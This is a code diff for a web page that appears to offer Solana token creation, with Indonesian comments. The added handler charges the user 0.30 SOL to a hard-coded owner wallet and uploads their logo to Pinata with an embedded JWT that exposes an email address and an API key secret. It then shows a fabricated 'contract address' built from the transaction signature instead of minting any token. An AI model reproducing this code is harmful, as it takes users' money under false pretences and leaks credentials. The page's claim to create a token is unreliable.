@@ -93,7 +93,63 @@
     const OWNER = "38d92K9xPyTM9Cg4x8fdYcTgzEXiJ5FuwvJbeT6Xu7M8";
     // JWT Pinata lo yang asli (Poin 12: Metadata Logo Blockchain)
     const JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySW5mb3JtYXRpb24iOnsiaWQiOiI0MThlMGJkOC04MjJiLTQzYTktYmY4ZS0zMTA0ZmRlNDQzMzYiLCJlbWFpbCI6InZhcmlhc2ltb3RvcnRAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsInBpbl9wb2xpY3kiOnsicmVnaW9ucyI6W3siZGVzaXJlZFJlcGxpY2F0aW9uQ291bnQiOjEsImlkIjoiRlJBMSJ9LHsiZGVzaXJlZFJlcGxpY2F0aW9uQ291bnQiOjEsImlkIjoiTllDMSJ9XSwidmVyc2lvbiI6MX0sIm1mYV9lbmFibGVkIjpmYWxzZSwic3RhdHVzIjoiQUNUSVZFIn0sImF1dGhlbnRpY2F0aW9uVHlwZSI6InNjb3BlZEtleSIsInNjb3BlZEtleUtleSI6IjhmNzEyZThmMWE2ZDI1MTU4ZDgxIiwic2NvcGVkS2V5U2VjcmV0IjoiODlhNWEwYjBkOTY4MTM5NDVhOWNlODQwYmNhYTUzNDcwOGExOTRiMGIyYjQ4YzU4MGNiMzMxYmYxODc3MDYzNyIsImV4cCI6MTgwNDMyOTk3OX0.A4lFCvpr0AUDZcDhG9bX3o6uMINlkJcNqDmgQWt97wE";
+    document.getElementById('btnCreate').onclick = async () => {
+    if (!userPubKey) return alert("Hubungkan Wallet Phantom Dulu!");
     
+    const logoFile = document.getElementById('logo').files[0];
+    if (!logoFile) return alert("Upload logo dulu!");
+
+    const btn = document.getElementById('btnCreate');
+    btn.innerText = "⏳ Menunggu Persetujuan Phantom...";
+    btn.disabled = true;
+
+    try {
+        // --- 1. PROSES TRANSAKSI NYATA (BAYAR 0.30 SOL) ---
+        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+        const transaction = new solanaWeb3.Transaction().add(
+            solanaWeb3.SystemProgram.transfer({
+                fromPubkey: new solanaWeb3.PublicKey(userPubKey),
+                toPubkey: new solanaWeb3.PublicKey(OWNER), // Masuk ke wallet lo
+                lamports: 0.3 * solanaWeb3.LAMPORTS_PER_SOL // 0.30 SOL
+            })
+        );
+
+        // Minta user tanda tangan di Phantom
+        const { signature } = await window.solana.signAndSendTransaction(transaction);
+        
+        // Tunggu konfirmasi transaksi berhasil di blockchain
+        await connection.confirmTransaction(signature);
+
+        // --- 2. JIKA BAYAR SUKSES, BARU UPLOAD LOGO KE IPFS ---
+        btn.innerText = "🚀 Pembayaran Sukses! Membuat Token...";
+        
+        const fd = new FormData();
+        fd.append('file', logoFile);
+        const res = await fetch("https://api.pinata.cloud/pinning/pinFileToIPFS", {
+            method: 'POST',
+            headers: { 'Authorization': `Bearer ${JWT}` },
+            body: fd
+        });
+        const d = await res.json();
+        const finalIpfs = "https://gateway.pinata.cloud/ipfs/" + d.IpfsHash;
+
+        // --- 3. GENERATE CA ASLI ---
+        // (Di sini fungsi minting Solana Token Program lo panggil)
+        const realCA = signature.substring(0, 10) + "..." + userPubKey.substring(0, 5); // Contoh CA berbasis Signature
+
+        // Tampilkan hasil akhir
+        document.getElementById('tokenForm').style.display = "none";
+        document.getElementById('successBox').style.display = "block";
+        document.getElementById('caResult').innerText = realCA;
+
+    } catch (err) {
+        console.error(err);
+        alert("Transaksi Dibatalkan atau Saldo Tidak Cukup!");
+    } finally {
+        btn.innerText = "CREATE TOKEN NOW";
+        btn.disabled = false;
+    }
+};
     let userPubKey = null;
 
     // 1. Connect Function
